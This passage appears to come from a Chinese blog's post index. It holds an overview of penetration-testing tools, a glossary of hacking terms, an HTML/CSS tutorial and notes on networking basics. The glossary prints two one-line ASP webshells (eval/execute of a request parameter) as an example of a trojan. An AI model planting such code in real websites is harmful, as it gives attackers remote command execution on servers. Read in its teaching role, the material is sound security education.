Metasploit框架使Metasploit具有良好的可扩展性，它的控制接口负责发现漏洞、攻击漏洞，提交漏洞，然后通过一些接口加入攻击后处理工具和报表工具。Metasploit框架可以从一个漏洞扫描程序导入数据，使用关于有漏洞主机的详细信息来发现可攻击漏洞，然后使用有效载荷对系统发起攻击。所有这些操作都可以通过Metasploit的Web界面进行管理，而它只是其中一种种管理接口，另外还有命令行工具和一些商业工具等等。 攻击者可以将来漏洞扫描程序的结果导入到Metasploit框架的开源安全工具Armitage中，然后通过Metasploit的模块来确定漏洞。一旦发现了漏洞，攻击者就可以采取一种可行方法攻击系统，通过Shell或启动Metasploit的meterpreter来控制这个系统。 这些有效载荷就是在获得本地系统访问之后执行的一系列命令。这个过程需要参考一些文档并使用一些数据库技术，在发现漏洞之后开发一种可行的攻击方法。其中有效载荷数据库包含用于提取本地系统密码、安装其他软件或控制硬件等的模块，这些功能很像以前BO2K等工具所具备的功能。 下载地址：https://www.metasploit.com/ 4.Aircrack-ngAircrack-ng是一个与802.11标准的无线网络分析有关的安全软件，主要功能有：网络侦测，数据包嗅探，WEP和WPA/WPA2-PSK破解。Aircrack-ng可以工作在任何支持监听模式的无线网卡上并嗅探802.11a，802.11b，802.11g的数据。该程序可运行在Linux和Windows上。Linux版本已经被移植到了Zaurus和Maemo系统平台, 并概念验证可移植到iPhone。 Aircrack-ng是Aircrack项目的一个分支。 下载地址：http://www.aircrack-ng.org/ 5.Burp SuiteBurp Suite 是用于攻击web 应用程序的集成平台。它包含了许多工具，并为这些工具设计了许多接口，以促进加快攻击应用程序的过程。 所有的工具都共享一个能处理并显示HTTP 消息，持久性，认证，代理，日志，警报的一个强大的可扩展的框架。 工具箱： Proxy——是一个拦截HTTP/S的代理服务器，作为一个在浏览器和目标应用程序之间的中间人，允许你拦截，查看，修改在两个方向上的原始数据流。 Spider——是一个应用智能感应的网络爬虫，它能完整的枚举应用程序的内容和功能。 Scanner[仅限专业版]——是一个高级的工具，执行后，它能自动地发现web 应用程序的安全漏洞。 Intruder——是一个定制的高度可配置的工具，对web应用程序进行自动化攻击，如：枚举标识符，收集有用的数据，以及使用fuzzing 技术探测常规漏洞。 Repeater——是一个靠手动操作来补发单独的HTTP 请求，并分析应用程序响应的工具。 Sequencer——是一个用来分析那些不可预知的应用程序会话令牌和重要数据项的随机性的工具。 Decoder——是一个进行手动执行或对应用程序数据者智能解码编码的工具。 Comparer——是一个实用的工具，通常是通过一些相关的请求和响应得到两项数据的一个可视化的“差异”。 下载地址：https://portswigger.net/burp/ 6.SQLMapSQLMap是一款用来检测与利用SQL注入漏洞的免费开源工具，它支持对检测与利用的自动化处理（数据库指纹、访问底层文件系统、执行命令）等。 sqlmap支持五种不同的注入模式： 1、基于布尔的盲注，即可以根据返回页面判断条件真假的注入。 2、基于时间的盲注，即不能根据页面返回内容判断任何信息，用条件语句查看时间延迟语句是否执行（即页面返回时间是否增加）来判断。 3、基于报错注入，即页面会返回错误信息，或者把注入的语句的结果直接返回在页面中。 4、联合查询注入，可以使用union的情况下的注入。 5、堆查询注入，可以同时执行多条语句的执行时的注入。 sqlmap支持的数据库有： MySQL, Oracle, PostgreSQL, Microsoft SQL Server, Microsoft Access, IBM DB2, SQLite, Firebird, Sybase和SAP MaxDB 可以提供一个简单的URL，Burp或WebScarab请求日志文件，文本文档中的完整http请求或者Google的搜索，匹配出结果页面，也可以自己定义一个正则来判断那个地址去测试。 测试GET参数，POST参数，HTTP Cookie参数，HTTP User-Agent头和HTTP Referer头来确认是否有SQL注入，它也可以指定用逗号分隔的列表的具体参数来测试。 可以设定HTTP(S)请求的并发数，来提高盲注时的效率。 下载地址：http://sqlmap.org/ 7.John The RipperJohn the Ripper是一款免费的开源软件，是一个快速的密码破解工具，用于在已知密文的情况下尝试破解出明文的破解密码软件，支持目前大多数的加密算法，如DES、MD4、MD5等。它支持多种不同类型的系统架构，包括Unix、Linux、Windows、DOS模式、BeOS和OpenVMS，主要目的是破解不够牢固的Unix/Linux系统密码。 下载地址：http://www.openwall.com/john/ 8.THC HydraTHC Hydra是一个非常流行的密码破解，它由一只非常活跃且经验丰富的开发团队开发。THC Hydra是一个快速稳定的网络登录攻击工具，它使用字典攻击和暴力攻击，尝试大量的密码和登录组合来登录页面。攻击工具支持一系列协议，包括邮件（POP3，IMAP等），数据库，LDAP，SMB，VNC和SSH。 下载地址：http://sectools.org/tool/hydra/]]></content>
      <tags>
        <tag>渗透工具</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[渗透测试相关名词解释]]></title>
    <url>%2F2019%2F09%2F25%2F%E6%B8%97%E9%80%8F%E5%90%8D%E8%AF%8D%E8%A7%A3%E9%87%8A%2F</url>
    <content type="text"><![CDATA[1.1 一些前置知识（包含但不限于） 脚本（asp、php、jsp） html（css、js、html） HTTP协议 CMS（B/S） 1.2 肉鸡 被黑客入侵并被长期驻扎的计算机或服务器。可以随意控制，可以是任意系统的设备，对象可以是企业，个人，政府等等所有单位。 1.3 抓鸡 利用使用量大的程序的漏洞，使用自动化方式获取肉鸡的行为。 1.4 Webshell 通过Web入侵的一种脚本工具，可以据此对网站服务进行一定程度的控制。 1.5 漏洞 硬件、软件、协议等等的可利用安全缺陷，可能被攻击者利用，对数据进行篡改，控制等。 1.6 木马 通过向服务端提交一句简短的代码，配合本地客户端实现webshell功能的木马。 &lt;%eval request(“pass”)%&gt; &lt;%execute(request(“pass”))%&gt; request(“pass”)接收客户端提交的数据，pass为执行命令的参数值。 eval/execute 函数执行客户端命令的内容 1.7 提权 操作系统低权限的账户将自己提升为管理员权限使用的方法。 1.8 后门 黑客为了对主机进行长期的控制，在机器上种植的一段程序或留下的一个”入口”。 1.9 跳板 使用肉鸡IP来实施攻击其他目标，以便更好的隐藏自己的身份信息。 1.10 旁站入侵 即同服务器下的网站入侵，入侵之后可以通过提权跨目录等手段拿到目标网站的权限。常见的旁站查询工具有：WebRobot、御剑、明小子和web在线查询等 1.11 C段入侵 即同C段下服务器入侵。如目标ip为192.168.180.253 入侵192.168.180.*的任意一台机器，然后利用一些黑客工具嗅探获取在网络上传输的各种信息。常用的工具有：在windows下有Cain，在UNIX环境下有Sniffit, Snoop, Tcpdump, Dsniff 等。 1.12 黑盒测试 在未授权的情况下，模拟黑客的攻击方法和思维方式，来评估计算机网络系统可能存在的安全风险。 黑盒测试不同于黑客入侵，并不等于黑站。黑盒测试考验的是综合的能力（OS、Datebase、Script、code、思路、社工）。思路与经验积累往往决定成败。 1.13 白盒测试 相对黑盒测试，白盒测试基本是从内部发起。白盒测试与黑盒测试恰恰相反，测试者可以通过正常渠道向被测单位取得各种资料，包括网络拓扑、员工资料甚至网站或其它程序的代码片断，也能够与单位的其它员工（销售、程序员、管理者……）进行面对面的沟通。 1.13 黑白盒的另一种说法 知道源代码和不知道源代码的渗透测试。这时，黑盒测试还是传统的渗透测试，而白盒测试就偏向于代码审计。 1.14 APT攻击 Advanced Persistent Threat，高级可持续性攻击，是指组织(特别是政府)或者小团体利用先进的攻击手段对特定目标进行长期持续性网络攻击的攻击形式。1.极强的隐蔽性2.潜伏期长，持续性强3.目标性强]]></content>
      <tags>
        <tag>渗透测试</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[HTML5]]></title>
    <url>%2F2019%2F09%2F25%2FHTML5%2F</url>
    <content type="text"><![CDATA[1.HTML语言：超文本标记语言； ​ 一个网页的组成应包含以下三个部分： ​ html：主体，装载各种标签； ​ css：装饰标签； ​ javascript：控制标签； 2.文件结构： ​ css：存放后缀名为.css的样式文件； ​ img：存放网页中需要的图片文件； ​ index.html：整个网站的首页； ​ js：存放后缀名为.js的样式文件； 3.默认的主体标签：（类似于搭建一个房子的主体） 1234567891011121314 &lt;!DOCTYPE html&gt; //定义HTML语言的主体 &lt;html lang='en'&gt; //定义语言类型&lt;/html&gt; &lt;html&gt; &lt;head&gt; //定义头部 &lt;title&gt;&lt;/title&gt; //定义网页标题 &lt;meta charset="utf-8"&gt; //定义字符类型，防止乱码 &lt;/head&gt; &lt;body&gt; //定义网页主体内容 &lt;/body&gt; &lt;/html&gt; 4.一些基础了解： ​ （1）注释符号或者 // 或者 /* */ ​ （2）定义id的样式# ; 定义类class的样式用. 5.块标签（div）与行标签（span）：（可以理解为墙，相当于一个溶液） ​ （1）块标签(div)：默认独占网页一行；由内容撑开高度；可以设置宽高 ​ （2）行标签(span)：默认在一行显示；由内容撑开宽高；不可以设置宽高 ​ div和span标签的作用就是帮助网页划分不同区域，作为容器使用； 6.CSS样式表： ​ 我们在网页上看到的文字的字体，大小，颜色，图片的大小，边框，背景颜色等，都需要 ​ css样式表帮助我们实现。 ​ CSS样式的引入方式： ​ （1）外部引入：创建后缀名为css的文件，在文件使用对应的选择器，在选择器中添 ​ 加相应的样式； ​ 在head部分加入link标签，引入外部css文件。 1234&lt;head&gt; &lt; !--引入css文件--&gt; &lt;link rel="stylesheet" href="css/index.css"&gt;&lt;/head&gt; ​ 优点：一个css文件可以控制多个页面；方便改版和维护；减少代码量， ​ 代码简洁，便于分工协作；有效利用缓存机制； ​ 缺点：相对于单页面来说，会有垃圾代码；加载时，会给服务器造成压力 ​ （2）内部引入：在head标签中加入style标签，在标签中使用不同的选择器，设置 ​ 样式； 123456&lt;style type="text/css"&gt;.box&#123; width: 250px; height: 800px; background-color: white;&#125; ​ 优点：速度快，没有请求压力；相对于外部引入，代码少； ​ 缺点：不宜改版和维护；代码较乱，不方便前后台沟通； ​ （3）行间样式：在标签内添加style属性，在其中添加对应的样式，样式与样式之间使 ​ 分号隔开； 1&lt;div style="width:100px;height:100px;bakgroung-color:pink"&gt;内容&lt;/div&gt; ​ 优点：优先级最高； ​ 缺点：多与代码多，不利于维护； 7.CSS基础样式： ​ （1）样式单位：px ——计算机屏幕上的像素点。 ​ （2）宽高样式： ​ width：设置元素的宽度——- width：100px; ​ height：设置元素的高度—— height：100px； ​ （3）边框样式： 1border-style：solid/dotted/dashed/none //定义边框线型 ​ none：无边框； ​ solid：实线 ​ dotted：点状边框； ​ dashed：虚线 1border-width：1px //定义边框宽度 1border-color：blue //定义边框颜色 1border：1px solid blue；//复合写法，综合定义边框的宽度、线型和颜色 1border-top/right/bottom/left; //复合属性，可单独设置上下左右边框的样式 ​ （4）背景样式： 1background-color：skyblue; //设置元素的背景颜色 注意：这里的颜色有三种定义方式：英文单词；十六进制；RGB颜色表 12345background-color：black/red/yellow; //设置元素的背景颜色为黑，红，黄；background-color：#RRGGBB; //设置元素的背景颜色为红色、绿色、蓝色background-color：rgb(123,123,123); //设置元素的背景颜色为灰色 ​ （5）盒模型：指css布局中，html中的每个元素在浏览器中的解析都可以被看作是一个 ​ 盒子，都拥有盒子一样的外形和平面空间。 ​ 作用：实现元素与元素之间，元素与内容之间的间距。 ​ margin：元素的外边距 ​ padding：元素的内边距 ​ border：元素的边框 ​ content：元素的内容 123&lt;body&gt; &lt;div style="border: 5px solid red; width: 100px; margin: 10px;padding: 10px"&gt;div1&lt;/div&gt;&lt;/body&gt; 123456789margin:10px； 上下左右外边距均为10像素margin:10px 20px； 上下外边距为10像素,左右为20像素margin:10px 30px 20px； 上外边距为10像素,左右为30像素，下外边距为20像素margin:10px 30px 20px 40px；上外边距为10像素,左为30像素，右为20像素，下外边距为40像素 1234margin-top 上边距 margin-left 左边距margin-right 右边距 margin-bottom 下边距 ​ 注意：行标签不能设置上下margin ​ 同时设置重复样式时，最后编剧按照代码从上到下的执行顺序产生效果。 8.标签与4个伪类 ​ 作用： 在页面中, 我们可以通过单击链接跳转到其他页面 通过使用标签在HTML中创建链接 将鼠标移动到链接上时，鼠标箭头会变成一只手。 ​ （1）链接到一个页面地址： 1&lt;a href="url"&gt;Link text&lt;/a&gt; ​ href 属性规定链接的目标 ​ 开始标签和结束标签之间的文字被作为超级链接来显示。 1实例：&lt;a href="https://www.baidu.com"&gt;百度&lt;/a&gt; ​ （2）链接到同一个页面的不同位置（书签）： 12345678910&lt;a href="#knowledge3"&gt;查看知识点3 &lt;/a&gt;&lt;h2&gt;知识点 1&lt;/h2&gt;&lt;p&gt;这是知识点1的内容......&lt;/p&gt;&lt;h2&gt;知识点 2&lt;/h2&gt;&lt;p&gt;这是知识点2的内容......&lt;/p&gt;&lt;h2 id="knowledge3"&gt;知识点 3&lt;/h2&gt;&lt;p&gt;这是知识点3的内容......&lt;/p&gt; ​ 标记“知识点3”的标签中有一个值为“konwledge3”的id属性 ​ 标记”查看知识点”的标签的href属性的值为一个字符”#”加上想要定位的id值]]></content>
      <tags>
        <tag>前端开发</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[网络各层模型概述]]></title>
    <url>%2F2019%2F09%2F24%2F%E5%90%84%E5%B1%82%E7%BD%91%E7%BB%9C%E6%A8%A1%E5%9E%8B%2F</url>
    <content type="text"><![CDATA[1.物理层：定义了终端设备的传输介质，传输的是比特流。 ​ 注意：不管是什么传输介质，传输数据的过程中，信号都会出现衰减，这个时候需 要使用设备来延长信号的传输距离。 ​ 物理层设备：hub集线器，只能识别比特流； ​ 总线型：网络传输效率特别低 ​ 无学习功能每个接口都是一个冲突域。 2.数据链路层：把比特流封装成数据帧，实现基于MAC地址的寻址和转发； ​ （1）MAC地址：也叫物理地址，以太网地址； ​ 由48位二进制数组成，为了读写方便，用十六进制表示。 ​ 其中前24位是厂商信息，后24位表示设备，由厂家自定义。 ​ MAC地址是由厂家出厂直接刻录到网卡里的，一般不能修改。 ​ ipconfig /all ——-用于查看网卡信息，在Windows命令行输入。 ​ MAC地址分类： ​ 单播MAC地址：如果一个MAC地址的第八位是0，这个地址表示单播MAC； 组播MAC地址：如果一个MAC地址的第八位是1，这个地址表示组播MAC； ​ 广播MAC地址：全 FF:FF:FF:FF ​ （2）以太网二层数据帧格式： ​ 6字节目标MAC地址+6字节源MAC地址+2字节类型+数据（最大1500字节）+ ​ 4字节的帧校验序列 ​ （3）数据链路层设备：交换机（二层设备） ​ 工作原理：利用ARP地址解析协议，根据IP地址找MAC地址； ​ Windows系统中的ARP命令： ​ arp -a：查看ARP缓存表； ​ arp -d：清除ARP缓存表； 123456789101、pc1想和pc3通信，先查看自己ARP表项目，如果有就直接发送数据；如果没有就发送广播，以ARP广播的形式发送出去。source：192.168.1.1 M1 destination：192.168.1.3 FF2、交换机：学习/转发学习：把pc1的MAC地址放到MAC地址表中；转发：目标地址为全FF，广播到除源端口意外的所有端口；3、反应：如果是来找我的就恢复；如果不是找我的，我就丢弃。pc3回复的报文,以单播的形式回复source： 192.168.1.3 M3 destination：192.168.1.1 M14、交换机：学习/转发学习：把pc3的MAC地址存储到自己的MAC地址表中；转发：收到单播的数据包，查找自己的MAC地址表中记录，直接单播给pc1; ​ （4）ARP欺骗：利用交换机广播的工作原理，对用户身份没有验证功能。 ​ 欺骗所有主机（告诉所有客户端假的网关mac地址）； ​ 中间人攻击（欺骗两个通信主机，获取他们的通信数据）； 3.网络层：把数据帧转换成数据包，实现基于IP地址的寻址和转发。 ​ 数据包格式：三层IP头部+数据 ​ 注意：TTL为生存时间期限，是一个三层防环机制，数据包每经过一个三层设备（路 由器)，TTL值就会减1，当TTL值=0时，那么这个数据包就不能继续传播，会 被丢弃；其中每经过一次三层设备，叫做一跳。 ​ tracert 域名或IP地址 ——追踪数据包，显示数据包经过的三层设备。 ​ 网络层协议： ​ ICMP：互联网控制报文协议，是一个错误侦测与回馈机制，用来测试网络连 通性 ​ 报文类型：request(请求报文)与reply(回复报文) ​ ping命令—-基于ICMP协议 1234567891011 -t 一直ping ，crl+c取消​ -a 解析主机名​ -l 指定测试数据包大小​ -i 指定生存时间​ -n 指定数据包的数量​ -f 不分片(不拆分数据包) ​ 网络层设备：路由器（三层） ​ 路由器作用： ​ （1）实现不同网段的通信 ​ （2）隔离广播域 ​ （3）为数据包寻找一条最优路径 ​ 注意：路由器的每个接口都是不同的一个网段 ​ MAC地址是二层的概念，是不能跨网段的。 ​ 路由器的工作原理： 123456789101112131415161718192021222324252627当PC1（192.168.1.1）------&gt;PC3（的92.168.2.1）通信的时候： （1）PC1先查看自己的ARP表，有直接发送；没有进行判断。 ​ PC1先判断目标主机和自己是否在同一个网段：若在同一个网段，直接发送ARP请求 （广播）；若没有在相同网段，就把数据包发送给网关；​ source源：192.168.1.1 PC1的MAC地址 ​ destination目标：192.168.2.1 PC1网关的MAC地址（2）路由器：根据目标MAC地址判断是不是找我的，是找我的就回复，不是就丢弃。​ 回复：把数据帧还原成数据包，根据目标IP地址查看路由表，转发。​ 路由器把到达192,。168.2.1的数据包从f0/1接口发送出去。​ source 192.168.1.1 PC3网关的MAC地址​ destination 192.168.2.1 PC3的MAC地址（3）PC3反应：给PC1回复数据包。 source： 192,.168.2.1 PC3的MAC地址​ destination： 192.168.1.1 PC3的网关MAC地址（4）路由器：目标Mac是找我的，我就拆包，看到里边的目标ip;根据目标IP进行路由表的 查找，从相应接口发送进去。​ source： 192.168.2.1 PC1的网关MAC地址​ destination： 192,168.1.1 PC1的MAC地址 ​ 边缘路由器：一端连着内网（LAN），一端连着外网（WAN） ​ 默认路由器：一般配置在出口路由器，一边连接内网一边连接外网，所有不知道的数据 包都交给互联网 ​ 解决链路冗余的两种方法：负载均衡与浮动路由。 ​ 负载均衡：多条链路同时进行传输； ​ 浮动路由：多条链路中至于一条是主链路，其他都是备份链路，只有主链路发生故 障，备份链路才会被启用。 ​ 通过修改静态路由的优先级（管理距离）来决定那条链路是主链路。 ​ 优先级的范围是1——255，越小越优先，默认是1可修改优先级，在下一 跳后添加 4.传输层：把数据包装花城数据段，为数据提供可靠（TCP）或不可靠的(UDP)传输，并为应 用程序提供端到端的服务。 ​ 传输层协议：TCP/IP协议族的传输层协议主要有TCP协议和UDP协议； ​ TCP（Transmission Control Protocol）传输控制协议：，端到端的协议 ​ 面向连接的，可靠的，提供全双工的服务； ​ 报文结构：源目端口号，序列号，确认号，flag标志位 ​ UDP（User Datagram Protocol）用户数据报协议； ​ 无连接的，不可靠的； ​ 报文结构：源目端口号，UDP长度，校验和； ​ netstat -an —-windows命令行查询本地看房的端口号及协议信息 12345678910***TCP三次握手：​（1）SYN=1; //向服务器发送想建立连接的请求； seq=x; //向服务器发送数据包，序列号编号为x； ​（2）SYN=1,ACK=1; //服务器回复同意建立连接请求，并确认了请求； seq=y,ack=x+1; //服务器回复数据包的序列号为y，并确认了PC的数据包x+1； ​（3）ACK=1; //pc确认后，给服务器回复，发送数据包序列号为x+1； seq= x+1,ack=y+1; //pc确认收到服务器的数据包y+1，并发送数据包序列号为 x+1； ​ 基于TCP的三次握手的攻击：（1）SYN攻击：攻击者向服务器发送大量的伪造请求报文，服务器会向假的请求者建立连接关系，但是实际上这些主机根本没有请求服务器建立连接，所以导致服务器一直处于半连接状态，如果连接过多，会造成服务器资源消耗严重，甚至死机。（2）LAND攻击：攻击者伪造报文，让服务器自己和自己建立连接，导致服务器资源消耗严重。 1234567891011121314151617***TCP四次断开连接：（1）pc没有数据传给服务器，请求拆除连接；​ FIN=1,seq=m;（2）服务器确认收到信息并回复响应pc;​ ACK=1,seq=n,ack=m+1;（3）服务器同意回复终止连接;​ FIN=1,seq=n,ack=m+1;（4）pc确认收到信息并回复给服务器;​ ACK=1,seq=m+1,ack=n+1; 5.会话层 6.表示层 7.应用层]]></content>
      <tags>
        <tag>网络</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[网络基础概述]]></title>
    <url>%2F2019%2F09%2F24%2F%E7%BD%91%E7%BB%9C%E5%9F%BA%E7%A1%80%2F</url>
    <content type="text"><![CDATA[1.什么是网络？ 计算机把不在同一地理位置的主机，通过传输介质和通信协议，实现网络通信和资源共享。 2.网络四要素？ 传输介质、通信协议、资源、终端 3.网络的分类： （1）按范围划分： ​ WAN:广域网（万维网—–外网—-公网） ​ LAN:局域网（内网—私网） ​ MAN;城域网 ​ PAN:个域网 （2）按IP地址划分： ​ 公网IP地址:由Inter NIC负责。这些IP地址分配给注册并向Inter NIC提出申请的组织机构。通过它直接访问因特网。 ​ A类：1.0.0.1-126.255.255.254 ​ B类：128.1.0.1-191.254.255.254 ​ C类：192.0.1.1-223.255.254.254 ​ 私网IP地址：属于非注册地址，专门为组织机构内部使用。 ​ A类：10.0.0.0——10.255.255.255 ​ B类：172.16.0.0——172.31.255.255 ​ C类：192.168.0.0——192.168.255.255 ​ D类：239.0.0.0——239.255.255.255 （3）按拓扑结构划分： ​ 星型拓扑：易于实现、网络扩展、故障排查 ​ 中心节点压力大，组网成本较高 ​ 网型拓扑：各个节点至少与其他两个节点相连 ​ 可靠性高、组网成本高 ​ 全网型和部分网状型 4.网络协议（语言）包括： ​ 语法、语义、语序（同步） 5.网络国际标准包组织括： ​ ISO：国际标准化组织 ​ ANSI：美国国家标准化局 ​ ITU-T：国际电信联盟-电信标准部 ​ IEEE：电气和电子工程师学会ISO：国际标准化组织 6.网络OSI标准七层模型： ​ 最开始的网络厂商是不兼容的，不能直接对接。 为了促进各厂商的融合，ISO组织提出 了OSI（Open System Interconnection，OSI）七层模型。 ​ 主要定义了数据在传输过程中如何进行‘封装’（打包）和‘解封装’（拆包） ​ 物理层：定义了终端设备的传输介质；传输比特流。 ​ 数据链路层：把比特流转化成数据帧，实现基于二层MAC地址的寻址与转发。 ​ 网络层：把数据帧转化成数据包，实现基于三层IP地址的寻址和转发。 ​ 传输层（运输层）：把数据包装花城数据段，为数据提供可靠（TCP）或不可靠的 (UDP)传输，并为应用程序提供端到端的服务。 ​ 会话层：用来建立、维持、管理和终止会话。 ​ 表示层：数据的表现形式，比如加密和压缩。 ​ 应用层：为用户提供服务。 7.常见的物理介质： （1）同轴线缆：传输速度快，只有一个芯，半双工 ​ 应用：电视，监控； ​ 100base-2(细线，理论上可以传输185m) ​ 100base-5(粗线，理论上可以传输500m) （2）光纤：两根芯，全双工 ​ 单模光纤：只传输一种光，传输距离远 ​ 多模光纤：可以传输多种光 （3）网线：以太网（内网）一种常见传输介质 ​ 结构划分： ​ 屏蔽双绞线（有锡纸包裹，适合室外布线防雨） ​ 非屏蔽双绞线（适合室内家用） ​ 传输速率划分： ​ 五类线CAT5—–10兆和百兆以太网 ​ 六类线CAT6—–千兆以太网 ​ 七类线（超六类）—–万兆以太网 ​ 网线排序分类： ​ T568A：绿白，绿，橙白，蓝，蓝白，橙，棕白，棕 ​ T568B：橙白，橙，绿白，蓝，蓝白，绿，棕白，棕 ​ 以太网中，使用1,2用于发送；3,6用于接收。 ​ 直通线：一根线的两端都是T568B—-用于不同设备之间 ​ 双绞线：一端是T568B,另一端是T568A—-同种设备之间用 ​ console线（全反线）—显示屏与主机间的那种长口线—-需要安装驱动 并对设备进行配置 8.常见术语： ​ 广播：一对多（老师讲课） ​ 组播：一对多（群聊），只有同一个组里的主机才能接收到。 ​ 单播：一对一 ​ 全双工：同一时刻可以同时进行发送（上传）和接收（下载）数据，如手机 ​ 半双工：同一时刻，智能进行发送或接收数据，如对讲机 ​ 单工：只能进行单向传输，如收音机 ​ 冲突域：一个冲突影响的范围 ​ 广播域：一个广播影响的范围 ​ 带宽：单位时间内传输数据的速度，单位：bit/s 9.进制： ​ 二进制：0,1 ​ 八进制：0,1,2,3,4,5,6,7 ​ 十进制：0,1,2,3,4,5,6,7,8,9 ​ 十六进制：0,1,2,3,4,5,6,7,8,9，A(10),B(11),C(12),D(13),E(14),F(15) ​ 进制转换： ​ 十进制转化成其他进制：短除法/2 ,/8 ,/16 ​ 其他进制转化成十进制：乘法权位相加 ​ 二进制与其他进制的转换：8421BCD码 10.IP地址分为 IPV4 与 IPV6 ​ IPV4：由32位二进制数组成，用点分十进制表示，地址空间42亿。 ​ IPV4按用途分类分为：公网地址与私网地址； ​ 公网地址：在互联网中使用，具有全球唯一性，运营商ISP负责分配公网IP ​ 私网地址：以太网中可重复使用 ​ IPV6：有128位二进制数组成，用冒号十六进制表示 11.IP地址分类： 123456 默认子网掩码 地址范围 A类：1---126 255.0.0.0 1.0.0.0——126.255.255.255B类：128---191 255.255.0.0 128.0.0.0——191.255.255.255C类：192---223 255.255.255.0 192.0.0.0——223.255.255.255D类：224---239 用于组播E类：240---255 用于科研 12.网络常见名词： ​ IP用来标识一台主机； ​ 子网掩码用来标识IP地址中的网络位和主机位； ​ 网络位：在IP地址中与子网掩码1（二进制）对应的是网络位； ​ 主机位：在IP地址中与子网掩码0（二进制）对应的是主机位； ​ 网络地址：主机位全为0——–路由器找路时使用 ​ 广播地址：主机位全为1——–同一个网络中广播的时候使用 13.路由协议：包括静态路由协议和动态路由协议 14.常用的端口号： 端口号范围：0——65535,1——1024是知名端口 TCP 21/20——FTP（21建立连接，20用来传输数据） TCP 80——Web服务（http协议）；https(TCP443) TCP445——Windows的共享 TCP23——Telnet，明文传输 TCP22——SSH，加密传输 TCP3389——远程恒桌面RDP服务 TCP25——SMTP（邮件传输协议），发送 TCP110——POP3（邮局协议版本3），接受邮件 TCP3306——MYSQL服务UDP53——DNS服务（如果是客户端请求服务器来解析的haul，使用的是UDP-53） UDP67,68——DHCP服务 UDP69——TFTP服务（简单文件传输协议） UDP111——RPC（远程过程调用） UDP123——NTP（网络时间协议） 15.MAC地址： ​ 由48bit的二进制数组成，为了读写方便，用十六进制表示。其中前24位是厂商信息，后 24位表示设备信息，由厂家自定义。MAC地址是由厂家出厂 的时候直接烧录到网卡里 ， 一般不能修改。​ ARP -a //查看ARP表——IP地址—MAC地址​ 单播MAC地址：如果一个MAC地址的第八位是0，这个地址表示单播MAC ​ 组播MAC地址：如果一个MAC地址的第八位是1，这个地址表示组播MAC ​ 广播MAC地址：全FF:FF:FF:FF 16.网络层数据包格式： ​ 数据包：三层ip头部+数据 IP头部： 标准长度为20字节 ​ TTL:tme to live 生存时间，是一个三层防环机制，可以限制一个数据包在网络中的传输时间。数据包没经过一个三层设备（路由），它的TTL值就会减1，如果TTL值=0，那么这个数据包就不能继续传播，会被丢弃，每经过一次三层设备，叫做一跳。 17.广播域广播域： ​ 广播：将广播地址作为目的地址的数据帧； ​ 广播域：网络中能接收到同一个广播所有节点的集合； 18.路由器的功能： （1）实现不同网段的通信（2）隔离广播域（3）为数据包寻找一条最优路径 ​ 注意：路由器的每个接口都是不同的一个网段（一个广播域） 19.解决链路冗余问题的方法： ​ 负载均衡：多条链路同时进行数据传输，没有主备链路之分；如果一跳down掉，还有 一条冗余 ​ 浮动路由：多条链路中至于一条是主链路，其他都是备份链路，只有主链路发生故障， 备份链路才会被启用。通过修改静态路由的优先级（管理距离）来决定那条 链路是主链路。 20.静态路由： ​ 边缘路由器（出口路由）：一端连着内网（LAN），一端连着外网（WAN） ​ 默认路由器：一般配置在出口路由器，一边连接内网一边连接外网，所有不知道的数 据包都交给互联网 21.TCP协议： ​ TCP：是可靠的传输方式；所有的web页面都是基于TCP的。 （1）TCP传输数据之前，先建立连接的； （2）TCP传输数据的时候，会给每个数据做一个编号（sequence 序列号），以保障数 据的可靠性。 （3）TCP是全双工的协议，同一时间可以上传和下载。 22.TCP的报文结构： （1）第一列：源目端口号 （2）第二列：序列号（发送端给每个数据进行编号） （3）第三列：确认号（用来对发送端的数据做确认）=====》保障数据传输的可靠性 （4）第四列：包含Flag位（标志位），用来描述这个报文的功能。 SYN=1，表示想建立连接。 ACK=1，表示报文是用来回复的。 FIN=1，表示想拆除连接。 23.基于TCP三次握手的攻击 （1）SYN攻击：攻击者向服务器发送大量的“伪造请求报文”，服务器会向“假的请求者”去建立邻居关系；但实际上，这些“主机”根本没有请求服务器建立连接，导致服务器一直处于半连接状态。如果连接的数量过多，会导致服务器资源消耗严重，甚至死机。 （2）LAND攻击：攻击者伪造报文，让服务器自己和自己建立连接，导致服务器资源消耗严重。 24.VLAN（virtual lan 虚拟局域网） ​ 一个VLAN=一个网段=一个广播域； 25.vlan划分的意义： （1）过大的广播域，造成了带宽的浪费； （2）过大的MAC地址表，造成转发效率低下； （3）存在安全隐患，不好管理 26：vlan的划分： ​ 静态vlan：基于端口划分，链接到交换机某个接口的主机始终属于一个vlan； ​ 动态vlan：基于MAC地址划分；不管主机移动到哪个端口，都属于一个vlan； ​ 注：动态vlan需要部署VMPS服务器，很麻烦，一般不用。 27.vlan的范围： ​ VLAN1是默认所有交换机的接口，不能删除； ​ 2-1001位用户使用的以太网VLAN（常用）； ​ 0,4095是保留VLAN，仅限系统使用； ​ 扩展VLAN 1025-4094 ，用于扩展以太网的VLAN； 28.Access链路与Trunk链路： Access链路：连接交换机与pc之间的链路，只能承载一个vlan； Trunk链路：连接交换机与交换机，交换机与路由器之间的链路，可以承载多个vlan； 29.以太网中实现中继，有两种封装类型： ​ ISL(Cisco私有标准) ​ IEEE 802.1q(国际通用标准) 30.Native Vlan（本征vlan）；在 交换机中默认是vlan1。 ​ 除了vlan1，其他自己创建的vlan都要打标签 （1）交换机收到一个来自native vlan的数据，会不打标签发送（原始数据帧） （2）如果交换机收到一个原始数据帧，会把数据帧广播到native vlan的端口 31.DTP协议：动态trunk协议，用来协商这条链路是否要成为trunk（思科私有协议） ​ trunk的模式：接入（Access）不发送DTP，也不协商；不成为trunk； ​ 干道（Trunk）强制为trunk，不管对端状态，收到DTP报文； ​ 动态企望（Dynamic desirable）主动发送和响应DTP报文协商； ​ 动态自动（Dynamic auto）不发送DTP，如果收到可以恢复，被动协商 ​ 非协商（Nonegotiate）不再发送DTP报文 ​ 如果是多个厂商对接，一般是trunk和nonegotiate参数搭配使用，不协商，强制为trunk 32.以太通道（EthernetChannel）：多条链路负载均衡，带宽提高；容错，当一条链路失效时，其他线路通信，不会丢包 ​ 解决交换机之间的链路冗余问题，可提高网络的高可用性。 ​]]></content>
      <tags>
        <tag>网络</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[思科模拟器中网络配置]]></title>
